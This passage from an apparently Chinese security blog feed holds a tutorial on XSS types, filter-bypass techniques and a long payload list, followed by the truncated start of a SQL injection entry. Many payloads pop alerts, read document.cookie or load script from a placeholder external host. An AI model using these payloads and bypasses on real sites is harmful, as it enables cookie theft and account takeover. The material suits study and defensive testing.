    <content type="html"><![CDATA[<h2 id="分类">分类</h2><p>XSS攻击大致可以分为三类</p><p><code>存储型XSS</code>：存储型<code>XSS</code>，持久化，代码是存储在服务器中的，如在个人信息或发表文章等地方，插入代码，如果没有过滤或过滤不严，那么这些代码将储存到服务器中，用户访问该页面的时候触发代码执行。这种<code>XSS</code>比较危险，容易造成蠕虫，盗窃<code>Cookie</code><br><code>反射型XSS</code>：非持久化，需要欺骗用户自己去点击链接才能触发<code>XSS</code>代码（服务器中没有这样的页面和内容），一般容易出现在搜索页面。反射型XSS大多数是用来盗取用户的<code>Cookie</code>信息。<br><code>DOM型XSS</code>：不经过后端，<code>DOM-XSS</code>漏洞是基于文档对象模型<code>(Document Objeet Model,DOM)</code>的一种漏洞，<code>DOM-XSS</code>是通过<code>url</code>传入参数去控制触发的，其实也属于反射型<code>XSS</code></p><h2 id="相关知识">相关知识</h2><p>一般攻击者构造的<code>EXP</code>是<code>JS</code>代码，因此攻击者的<code>JS</code>代码水平也一定程度上决定了其攻击的效果</p><p>同时网上也存在一些免费的<code>XSS</code>平台来构造代码实施攻击</p><h3 id="反射型">反射型</h3><p>反射型<code>XSS</code>数据的流向是：前端 -&gt; 后端 -&gt; 前端</p><p>一般出现在对用户的输入没有进行严格的过滤，如我们有如下代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;p&gt;hello,<span class="hljs-subst">$_GET</span>[&#x27;user&#x27;]&lt;/p&gt;&quot;</span>; <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>当网站未对用户输入的名字进行过滤时，我们尝试输入<code>&lt;script&gt;alert(&quot;Hacker&quot;)&lt;/script&gt;</code>那么被网站进行解析时，便会弹出提示框<code>Hacker</code></p><h4 id="常见出现场景">常见出现场景</h4><p>将不可信数据插入到HTML标签之间时；// 例如<code>&lt;div&gt;</code>, <code>&lt;p&gt;</code>；</p><p>将不可信数据插入到HTML属性里时；// 例如：<code>&lt;div width=$INPUT&gt;&lt;/div&gt;</code></p><p>将不可信数据插入到SCRIPT里时；// 例如：<code>&lt;script&gt;var message = &quot;$INPUT &quot;;&lt;/script&gt;</code></p><p>还有插入到Style属性里的情况，同样具有一定的危害性；// 例如<code>&lt;span style=&quot; property : $INPUT&quot;&gt;&lt;/span&gt;</code></p><p>将不可信数据插入到HTML URL里时，// 例如：<code>&lt;a href=&quot;[http://www.abcd.com?param=](http://www.ccc.com/?param=) $INPUT &quot;&gt;&lt;/a&gt;</code></p><h3 id="存储型">存储型</h3><p>与反射型<code>XSS</code>产生原因相似，不同的是反射型攻击生效仅有一次，不会保留在服务器中，而存储型<code>XSS</code>，可以保留在服务器中，导致其他用户和管理员访问对应资源时执行了恶意代码</p><p>存储型XSS的数据流向是：前端 -&gt; 后端 -&gt; 数据库 -&gt; 后端 -&gt; 前端</p><p>我们可以将其理解为我们在某一个页面插入了我们的<code>XSS</code>攻击脚本，数据库会将其保存到服务器中，然后在网站其他地方调用这个数据时，网页会解析我们的攻击脚本，从而再次执行</p><h3 id="DOM型">DOM型</h3><p><code>DOM</code>型<code>XSS</code>是基于<code>DOM</code>文档对象模型的。对于浏览器来说，<code>DOM</code>文档就是一份<code>XML</code>文档，当有了这个标准的技术之后，通过<code>JavaScript</code>就可以轻松的访问<code>DOM</code>。当确认客户端代码中有<code>DOM</code>型<code>XSS</code>漏洞时，诱使(钓鱼)一名用户访问自己构造的<code>URL</code>，利用步骤和反射型很类似，但是唯一的区别就是，构造的<code>URL</code>参数不用发送到服务器端，可以达到绕过<code>WAF</code>、躲避服务端的检测效果。</p><p><code>DOM</code>数据流向是： 前端 -&gt; 浏览器</p><h2 id="相关利用">相关利用</h2><h3 id="XSS相关攻击载荷">XSS相关攻击载荷</h3><p>以下所有标签的 &gt; 都可以用 // 代替， 例如：<code>&lt;script&gt;alert(1)&lt;/script//</code></p><p><code>&lt;script&gt;</code>标签：<code>&lt;script&gt;</code>标签是最直接的<code>XSS</code>有效载荷，脚本标记可以引用外部的<code>JavaScript</code>代码，也可以将代码插入脚本标记中</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;script&gt;alert(<span class="hljs-string">&quot;hack&quot;</span>)&lt;/script&gt;   #弹出hack<br>&lt;script&gt;alert(<span class="hljs-regexp">/hack/</span>)&lt;/script&gt;   #弹出hack<br>&lt;script&gt;alert(<span class="hljs-number">1</span>)&lt;/script&gt;        #弹出<span class="hljs-number">1</span>，对于数字可以不用引号<br>&lt;script&gt;alert(<span class="hljs-built_in">document</span>.cookie)&lt;/script&gt;      #弹出cookie<br>&lt;script src=http:<span class="hljs-comment">//xxx.com/xss.js&gt; &lt;/script&gt;  # 引用外部的xss</span><br></code></pre></td></tr></table></figure><p><strong>svg 标签</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs none">&lt;svg onload=&quot;alert(1)&quot;&gt;<br>&lt;svg onload=&quot;alert(1)&quot;//<br></code></pre></td></tr></table></figure><p><strong>img 标签</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;img  src=<span class="hljs-number">1</span>  οnerrοr=alert(<span class="hljs-string">&quot;hack&quot;</span>)&gt;<br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">img</span>  <span class="hljs-attr">src</span>=<span class="hljs-string">1</span>  ο<span class="hljs-attr">nerr</span>ο<span class="hljs-attr">r</span>=<span class="hljs-string">alert(document.cookie)</span>&gt;</span>  #弹出cookie</span><br></code></pre></td></tr></table></figure><p><strong>body 标签</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;body οnlοad=alert(<span class="hljs-number">1</span>)&gt;<br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">body</span> ο<span class="hljs-attr">npagesh</span>ο<span class="hljs-attr">w</span>=<span class="hljs-string">alert(1)</span>&gt;</span></span><br></code></pre></td></tr></table></figure><p><strong>video 标签</strong></p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs swift"><span class="hljs-operator">&lt;</span>video οnlοadstart<span class="hljs-operator">=</span>alert(<span class="hljs-number">1</span>) src<span class="hljs-operator">=</span><span class="hljs-string">&quot;/media/hack-the-planet.mp4&quot;</span> <span class="hljs-operator">/&gt;</span><br></code></pre></td></tr></table></figure><p><strong>style 标签</strong></p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs swift"><span class="hljs-operator">&lt;</span>style οnlοad<span class="hljs-operator">=</span>alert(<span class="hljs-number">1</span>)<span class="hljs-operator">&gt;&lt;/</span>style<span class="hljs-operator">&gt;</span><br></code></pre></td></tr></table></figure><p><strong>a 标签</strong></p><p>当我们存在一个<code>&lt;a&gt;</code>标签，我们输入的任何东西都会被添加到<code>&lt;a&gt;</code>标签中的<code>href</code>时，我们可以直接输入<code>Javascript</code>语句进入攻击</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-variable">javascript</span>:<span class="hljs-function"><span class="hljs-title">alert</span>(<span class="hljs-number">1</span>)</span><br></code></pre></td></tr></table></figure><h2 id="相关绕过">相关绕过</h2><h3 id="绕过一">绕过一</h3><p>插入语句被写做为了值时，我们可以手动添加<code>&quot;&gt;</code>使前面的标签进行闭合</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">&quot;&gt;<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>alert(1)<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="绕过二">绕过二</h3><p><code>htmlspecialchars()</code>函数把预定义的字符转换为 <code>HTML</code> 实体如：</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs 1c">- <span class="hljs-meta">&amp; （和号）成为 &amp;amp;</span><br>- <span class="hljs-string">&quot; （双引号）成为 &amp;quot;</span><br>- &#x27; （单引号）成为 &#x27;<br>- &lt; （小于）成为 <span class="hljs-meta">&amp;lt;</span><br>- &gt; （大于）成为 <span class="hljs-meta">&amp;gt;</span><br></code></pre></td></tr></table></figure><p><code>htmlspecialchars</code>函数只针对<code>&lt;&gt;</code>大于小于号进行<code>html</code>实体化，我们还可以利用其他方法进行<code>xss</code>注入，这里我们可以利用<code>onfocus</code>事件绕过</p><blockquote><p><code>onfocus</code> 事件在对象获得焦点时发生，常用于<code>&lt;input&gt;</code>、<code>&lt;select&gt;</code>、<code>&lt;a&gt;</code> 标签</p></blockquote><p>我们可以使用鼠标属性，添加一个鼠标点击</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-string">&#x27;onclick=&#x27;</span><span class="hljs-function"><span class="hljs-title">alert</span>(<span class="hljs-number">1</span>)</span><br><span class="hljs-string">&quot;onclick=&quot;</span><span class="hljs-function"><span class="hljs-title">alert</span>(<span class="hljs-number">1</span>)</span><br></code></pre></td></tr></table></figure><h3 id="绕过三">绕过三</h3><p>当页面纯在有<code>htmlspecialchars</code>过滤以及<code>onclick</code>过滤时，我们可以将<code>input</code>标签进行提前闭合，然后插入另一个<code>&lt;a&gt;&lt;/a&gt;</code>标签</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">&quot;&gt;<span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span> = <span class="hljs-string">javascript:alert(1)</span>&gt;</span>hacker<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br></code></pre></td></tr></table></figure><p>或者也可以使用<code>&lt;iframe&gt;</code>标签完成</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">&quot;&gt;<span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;javascript:alert(1)&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">iframe</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="绕过四">绕过四</h3><p>当我们的一些标签被过滤时，可以尝试更改大小写来尝试绕过</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-string">&#x27;ONclick=&#x27;</span><span class="hljs-function"><span class="hljs-title">alert</span>(<span class="hljs-number">1</span>)</span><br></code></pre></td></tr></table></figure><h3 id="绕过五">绕过五</h3><p>当我们的一些关键字直接被删除的方式进行过滤时，我们可以尝试使用双写，再原先标签中再插入一个标签，这种方式方式一般用于没有对我们输入语句循环检测时</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-string">&#x27;oonnclick=&#x27;</span><span class="hljs-function"><span class="hljs-title">alert</span>(<span class="hljs-number">1</span>)</span><br></code></pre></td></tr></table></figure><h3 id="绕过六">绕过六</h3><p>当我们的<code>JavaScript</code>被过滤时，我们可以尝试将我们的输入进行编码，将其转换为<code>HTML</code>的实体字符</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gcode">原：javascript:alert<span class="hljs-comment">(1)</span><br>转换后：&amp;<span class="hljs-attr">#x6</span>A;&amp;<span class="hljs-attr">#x61</span>;&amp;<span class="hljs-attr">#x76</span>;&amp;<span class="hljs-attr">#x61</span>;&amp;<span class="hljs-attr">#x73</span>;&amp;<span class="hljs-attr">#x63</span>;&amp;<span class="hljs-attr">#x72</span>;&amp;<span class="hljs-attr">#x69</span>;&amp;<span class="hljs-attr">#x70</span>;&amp;<span class="hljs-attr">#x74</span>;&amp;<span class="hljs-attr">#x3</span>A;&amp;<span class="hljs-attr">#x61</span>;&amp;<span class="hljs-attr">#x6</span>C;&amp;<span class="hljs-attr">#x65</span>;&amp;<span class="hljs-attr">#x72</span>;&amp;<span class="hljs-attr">#x74</span>;&amp;<span class="hljs-attr">#x28</span>;&amp;<span class="hljs-attr">#x31</span>;&amp;<span class="hljs-attr">#x29</span>;<br></code></pre></td></tr></table></figure><h3 id="绕过七">绕过七</h3><p>当我们的输入是通过<code>Get</code>的方式进行传参时，网站也过滤了大量的标签，我们可以尝试更换一种传参方式来进行构造</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nix">?<span class="hljs-attr">t_sort=&quot;</span> <span class="hljs-attr">onfocus=javascript:alert()</span> <span class="hljs-attr">type=&quot;text</span><br></code></pre></td></tr></table></figure><h3 id="绕过八">绕过八</h3><p>当我们的输入是通过<code>Post</code>方式进行传参时，我们可以使用<code>BurpSuit</code>对网页进行抓包，观察网页能够提交的内容，修改对应的报文进行发送</p><h3 id="绕过九">绕过九</h3><p>当文件中出现<code>ng-include</code>时，其可以用于包含外部的<code>HTML</code>文件，默认情况下我们所包含的文件需要在同一个域名下</p><blockquote><p>ng-include指令就是文件包涵的意思，用来包涵外部的html文件，如果包涵的内容是地址，需要加引号</p></blockquote><p>对此我们可以使用如下代码进行包含：</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-string">?s</span>rc=<span class="hljs-string">&#x27;XXX&#x27;</span><br></code></pre></td></tr></table></figure><p><code>XXX</code>为我们所需要包含的文件，如果<code>XXX</code>存在某种<code>XSS</code>漏洞的话，我们可以利用其存在的问题来操控我们可以包含文件的网页，因此我们有如下<code>payload</code></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">?src=&#x27;XXX?name=<span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">1</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">alert(1)</span>&gt;</span>&#x27;<br></code></pre></td></tr></table></figure><h3 id="绕过十">绕过十</h3><p>当我们的空格输入被过滤时，我们可以输入<code>URL</code>编码下的<code>%0A</code>或<code>%0D</code>来进行绕过</p><h3 id="绕过十一">绕过十一</h3><p>当我们遇到<code>&lt;embed&gt;</code>标签时，我们可以使用<code>onclick</code>或<code>onmouseover</code>绕过，因为这两个变量是互相拼接起来的，所以在输入<code>arg02</code>时在<code>b</code>之后加一个空格，当浏览器解析到<code>b</code>的时候就停止判断，然后将<code>onclick</code>或<code>onmouseover</code>看作另外一个属性</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">arg01</span>=a&amp;arg02=aaa <span class="hljs-attribute">onmousemove</span>=<span class="hljs-string">&#x27;alert(1)&#x27;</span><br></code></pre></td></tr></table></figure><h2 id="一些Payload">一些Payload</h2><p>理论上来说XSS漏洞是可以彻底解决的</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">alert(<span class="hljs-built_in">document</span>.cookie)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">prompt(<span class="hljs-built_in">document</span>.cookie)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">confirm(<span class="hljs-regexp">/xss/</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>\u0061\u006C\u0065\u0072\u0074(1)<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>       //Unicode码  还有十六进制 URL编码 JS编码 HTML实体编码等等</span><br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">alert<span class="hljs-comment">/*dsa*/</span>(<span class="hljs-number">1</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>   //绕过黑名单</span><br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>(alert)(1)<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>        //绕过黑名单</span><br><span class="xml">&lt;svg/onload=alert(1)&gt;</span><br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">body</span> <span class="hljs-attr">onload</span>=<span class="hljs-string">alert(</span>&quot;<span class="hljs-attr">XSS</span>&quot;)&gt;</span></span><br><span class="xml"></span><br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">svg</span> <span class="hljs-attr">onload</span>=<span class="hljs-string">&quot;alert(1)&quot;</span>&gt;</span>       //过滤 script时</span><br><span class="xml">&quot;&gt;&lt;svg/onload=alert(1)//</span><br><span class="xml"></span><br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;1&quot;</span> <span class="hljs-attr">autofocus</span> <span class="hljs-attr">onfocus</span>=<span class="hljs-string">alert(1)</span>  <span class="hljs-attr">x</span>=<span class="hljs-string">&quot;&quot;</span>&gt;</span>   //过滤 script时</span><br><span class="xml"></span><br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;&quot;</span> <span class="hljs-attr">onclick</span>=<span class="hljs-string">&quot;alert(1111)&quot;</span>&gt;</span></span><br><span class="xml"></span><br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;javascript:alert(1)&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">iframe</span>&gt;</span>      //过滤 script时</span><br><span class="xml"></span><br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">svg</span> <span class="hljs-attr">onmousemove</span>=<span class="hljs-string">&quot;alert(1)&quot;</span>&gt;</span></span><br><span class="xml"></span><br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;name&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">””</span> <span class="hljs-attr">onmousemove</span>=<span class="hljs-string">prompt(document.cookie)</span> &gt;</span></span><br><span class="xml"></span><br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript"><span class="hljs-built_in">eval</span>(<span class="hljs-built_in">String</span>.fromCharCode(<span class="hljs-number">97</span>,<span class="hljs-number">108</span>,<span class="hljs-number">101</span>,<span class="hljs-number">114</span>,<span class="hljs-number">116</span>,<span class="hljs-number">40</span>,<span class="hljs-number">49</span>,<span class="hljs-number">41</span>))</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br><span class="xml"></span><br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span> = <span class="hljs-string">&quot;button&quot;</span>  <span class="hljs-attr">value</span> =<span class="hljs-string">&quot;clickme&quot;</span> <span class="hljs-attr">onclick</span>=<span class="hljs-string">&quot;alert(&#x27;click me&#x27;)&quot;</span> /&gt;</span></span><br><span class="xml"></span><br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">BODY</span> <span class="hljs-attr">onload</span>=<span class="hljs-string">&quot;alert(&#x27;XSS&#x27;)&quot;</span>&gt;</span></span><br><span class="xml"></span><br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">IMG</span> <span class="hljs-attr">SRC</span>=<span class="hljs-string">&quot;&quot;</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">&quot;alert(&#x27;XSS&#x27;)&quot;</span>&gt;</span></span><br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">IMG</span> <span class="hljs-attr">SRC</span>=<span class="hljs-string">&quot;&quot;</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">&quot;javascript:alert(&#x27;XSS&#x27;);&quot;</span>&gt;</span></span><br><span class="xml"></span><br><span class="xml">制表符 绕过滤器的</span><br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">IMG</span> <span class="hljs-attr">SRC</span>=<span class="hljs-string">&quot;&quot;</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">&quot;jav&amp;#x9ascript:alert(&#x27;XSS&#x27;);&quot;</span>&gt;</span></span><br><span class="xml">1.<span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">src</span>=<span class="hljs-string">javas</span><span class="hljs-attr">cript:alert</span>(<span class="hljs-attr">1</span>)&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">iframe</span>&gt;</span> //Tab</span><br><span class="xml">2.<span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">src</span>=<span class="hljs-string">javas</span></span></span><br><span class="hljs-tag"><span class="xml"><span class="hljs-attr">cript:alert</span>(<span class="hljs-attr">1</span>)&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">iframe</span>&gt;</span> //回车</span><br><span class="xml">3.<span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">src</span>=<span class="hljs-string">javas</span></span></span><br><span class="hljs-tag"><span class="xml"><span class="hljs-attr">cript:alert</span>(<span class="hljs-attr">1</span>)&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">iframe</span>&gt;</span> //换行</span><br><span class="xml">4.<span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">src</span>=<span class="hljs-string">javascript:alert(1)</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">iframe</span>&gt;</span> //编码冒号</span><br><span class="xml">5.<span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">src</span>=<span class="hljs-string">javasc</span></span></span><br><span class="hljs-tag"><span class="xml"><span class="hljs-attr">ript:alert</span>(<span class="hljs-attr">1</span>)&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">iframe</span>&gt;</span> //HTML5 新增的实体命名编码，IE6、7下不支持</span><br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">javascript:\u0061\u006C\u0065\u0072\u0074(1)</span>&gt;</span>Click<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></span><br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">javascript:%5c%75%30%30%36%31%5c%75%30%30%36%43%5c%75%30%30%36%35%5c%75%30%30%37%32%5c%75%30%30%37%34(1)</span>&gt;</span>Click<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></span><br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">javascript:%5c%75%30%30%36%31%5c%75%30%30%36%43%5c%75%30%30%36%35%5c%75%30%30%37%32%5c%75%30%30%37%34(1)</span>&gt;</span>Click<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></span><br><span class="xml"></span><br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">object</span> <span class="hljs-attr">data</span>=<span class="hljs-string">&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgiWHNzVGVzdCIpOzwvc2NyaXB0Pg==&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">object</span>&gt;</span></span><br><span class="xml"></span><br><span class="xml">&quot;&gt;<span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;x&quot;</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">&quot;eval(String.fromCharCode(97,108,101,114,116,40,100,111,99,117,109,101,110,116,46,99,111,111,107,105,101,41,59))&quot;</span>&gt;</span></span><br><span class="xml"></span><br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">onerror=alert;<span class="hljs-keyword">throw</span> <span class="hljs-built_in">document</span>.cookie</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span></span><span class="hljs-template-variable">&#123;onerror=alert&#125;</span><span class="xml"><span class="javascript"><span class="hljs-keyword">throw</span> <span class="hljs-number">1337</span></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>         //过滤 单引号，双引号，小括号时   没过滤script</span><br><span class="xml"></span><br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;&quot;</span> <span class="hljs-attr">onclick</span>=<span class="hljs-string">&quot;alert(1111)&quot;</span>&gt;</span></span><br><span class="xml">&#x27; οnclick=alert(1111) &#x27;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>SQL 注入</title>
    <link href="/2022/08/29/SQL%20%E6%B3%A8%E5%85%A5/"/>
    <url>/2022/08/29/SQL%20%E6%B3%A8%E5%85%A5/</url>
    
    <content type="html"><![CDATA[<h2 id="简单数据库操作">简单数据库操作</h2><h3 id="select">select</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> id <span class="hljs-operator">=</span> <span class="hljs-number">1</span>;<br></code></pre></td></tr></table></figure><p><code>select + 列名(* 代表所有) from + 查询表 + where + 查询内容</code></p><p>上面查询语句等价于</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> id <span class="hljs-keyword">in</span> (<span class="hljs-string">&#x27;1&#x27;</span>);<br></code></pre></td></tr></table></figure><p>从<code>user</code>表，擦寻所有包含<code>id</code>为<code>1</code>的数据</p><p>同时我们可以使用<code>()</code>提高对应的查询优先级，数据库将会先查询括号内内容，之后再根据括号外的内容进行查询</p><h3 id="union">union</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> id <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> email_id <span class="hljs-keyword">from</span> emails; <br></code></pre></td></tr></table></figure><p><code>union</code>会同时查询两个项目，<code>user</code>将会先被查询，随后执行查询<code>emails</code></p><blockquote><p>union 查询有一个限制，前后查询的列数必须要相同</p></blockquote><h3 id="group-by">group by</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> userneme <span class="hljs-keyword">from</span> users <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> <span class="hljs-number">3</span>;<br></code></pre></td></tr></table></figure><p>可以通过<code>group 